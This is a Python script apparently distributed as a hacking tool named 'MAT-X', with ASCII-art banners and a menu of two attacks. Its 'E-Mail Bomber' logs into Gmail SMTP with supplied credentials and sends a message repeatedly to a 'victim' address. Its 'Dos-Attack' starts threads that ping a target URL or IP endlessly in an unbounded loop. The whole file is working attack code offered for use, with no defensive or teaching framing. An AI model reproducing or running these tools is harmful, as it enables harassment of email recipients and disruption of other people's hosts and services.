import subprocess
import smtplib
import socket , time
from threading import Thread
print("\033[33m\033[1m                  ___ ___  _______  _______           ___ ___  ")
print("                 |   Y   ||   _   ||       | ______  (   Y   ) ")
print("                 |.      ||.  ■   ||.|   | ||______|  \  1  /  ")
print("                 |. \_/  ||.  _   |`-|.  |-'          /  _  \  ")
print("                 |:  |   ||:  |   |  |:  |           /:  |   \ ")
print("                 |::.|:. ||::.|:. |  |::.|          (::. |:.  )")
print("                 `--- ---'`--- ---'  `---'           `--- ---'")
print('                                                          v1.0.1')
print(' __________________________________________________\n'.center(78))
print('\033[32m\033[1m Information'.center(78))
print('\033[31m======================================'.center(78))
print('\033[33mTool    : \033[31mMAT-X'.center(61))
print('\033[33mAuthor  : \033[31mAnonymous'.center(65))
print('\033[33mVersion : \033[31mv1.0.1'.center(61))
print('\033[31m ======================================\n\n'.center(78))
print('\033[30mStart Tool With Command \033[31m--matx\n\n'.center(75))
					#######E-MAIL BOMBER#######
def bomb():
	print('\033[36m','''
	                                                                                            
                                                                                          
                                                                                          
                 .                                                                        
                 -                                .-=+*******+-.                          
                .+       ..                   .-+****************-                        
      ...   :.  -*.    -=.                 .-+*******=-::..:-+****+                       
        :==-.   -=:  =#+                 -+******=:.          :****+                      
          .-*-        : :.            -+******=:               :****:                     
        =:     -***-    :         .-+******+:                  :****:                     
        .  ::  +*****=--:::::-==+*******+-.                    +****                      
     ..:-====   =*******************+=:               ...     =****:                      
              :.  .:==+******++=-:.                .=######*++###*-                       
       .=    =*=  -=                             :+###############+=:                     
        .   -=.   :*.                          :+#####################-                   
           :.  .   -.                    .:--=*########################:                  
                    .              .-=+***#############################+                  
                               .-+***###################################:                 
                            .-****######################################*                 
                          :+***##########################################=                
                        -****#######************##########################*-              
                      :***######********************########################*-            
                     +***#####************************############%%%%%#######+.          
                   .***######***************************###########%%%%%%%#####*:         
                  -***######*****************************###########%%%%%%%%#####-        
                 -***######*******************************##########%%%%%%%%%#####-       
                :***######*********************************##########%%%%%%%%%#####:      
                ***#######*********************************##########%%%%%%%%%%####*.     
               -**########*********************************##########%%%%%%%%%%%####=     
               ***########*********************************##########%%%%%%%%%%%####*     
              :**##########********************************##########%%%%%%%%%%%%####-    
              =**##########*******************************##########%%%%%%%%%%%%%####=    
              +**###########*****************************###########%%%%%%%%%%%%%####+    
              +**############***************************###########%%%%%%%%%%%%%%####+    
              =**##############***********************############%%%%%%%%%%%%%%%####+    
              :**#################*****************##############%%%%%%%%%%%%%%%%####-    
               **######################********################%%%%%%%%%%%%%%%%%####*.    
               =**############################################%%%%%%%%%%%%%%%%%%####=     
               .**##########################################%%%%%%%%%%%%%%%%%%%####*.     
                :**#####################################%%%%%%%%%%%%%%%%%%%%%%#####-      
                 =**########%%%%#####################%%%%%%%%%%%%%%%%%%%%%%%%#####=       
                  =**########%%%%%%%%%%#######%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#####+        
                   -**#######%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%####*-         
                    .***#######%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#####*.          
                      -**#######%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#####*=            
                        =**#######%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#######=.             
                         .=**#########%%%%%%%%%%%%%%%%%%%%%%%%%%%#######*=.               
                            :+**###########%%%%%%%%%%%%%%%%%#########*+:                  
                               :=***##############################*=:                     
                                  .-+***#####################**+-.                        
                                       .:-=++**********++=-:.                             
                                                                                          
                                                                                       
	''')
	
	user = input('\nEnter E-mail: ')
	pas = input('\nPassword: ')
	to = input('\nEnter Victims E-mail: ')
	msg = str(input('\nWrite Your Message: '))
	no = int(input('Number of E-mail You Want to Send: '))
	def bombnest(u,p,v,m):
		server = smtplib.SMTP('smtp.gmail.com','587')
		server.starttls()
		server.login(u,p)
		server.sendmail(u,v,m)
	x = 1
	for x in range(no):
		bombnest(user,pas,to,msg)
		print(f'{[x+1]} E-mail sent')
		x += 1
                                                           
	                #####DOS-ATTACK#####
def dos():
	print('''
	
	       
	      ______    _______  _______ 
             |   _  \  |   _   ||   _   |
             |.  |   \ |.  |   ||   1___|
             |.  |    \|.  |   ||____   |
             |:  1    /|:  1   ||:  1   |
             |::.. . / |::.. . ||::.. . |
             `------'  `-------'`-------'
	
	''')
	print('\033[32mNOTE:CUT [http://] or [https://] FROM THE URL'.center(74))
	imp = input('\033[35mUrl or Ip: ')
	def frequency0():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
	def frequency1():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
	def frequency2():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
	def frequency3():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)	
	def frequency4():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
	def frequency5():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
	def frequency6():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
	def frequency7():
		while True:
			command = ['ping',imp]
			cli = subprocess.call(command)
		print('try again')
	for x in range(100):
		while True:
			Thread(target=frequency0).start()
			Thread(target=frequency1).start()
			Thread(target=frequency2).start()
			Thread(target=frequency3).start()
			Thread(target=frequency4).start()
			Thread(target=frequency5).start()
			Thread(target=frequency6).start()
			Thread(target=frequency7).start()
		
def nest():
	user = input('\n:Input@Name >> ')
	print(f'\n\033[32m                 ____WELCOME {user.upper()}____\n')
	def tools():
		print('\033[31m    ==========================='.center(61))
		print('\033[35m  [+] Tools [+]'.center(62))
		print('\033[31m    ==========================='.center(61))
		print('\033[33m[01]    : \033[32mE-Mail Bomber'.center(68))
		print('\033[33m[02]    : \033[32mDos-Attack'.center(64))
		option = str(input('\n\033[33mChoose Options : '))
		if option == '01':
			bomb()
		elif option == '02':
			dos()
		else:
			print('No Command Found',option)
			tools()
	tools()	
def main():
	start = str(input('\033[31m:matx@input >> '))
	if start == '--matx':
		nest()
	elif start == '' or start == ' ' or start == '  ':
		main()
	elif start == 'matx':
		print(f'Command {start} not found, Type \033[33m--matx')	
	else:
		print('No Command Found',start)
		main()			
main()	                					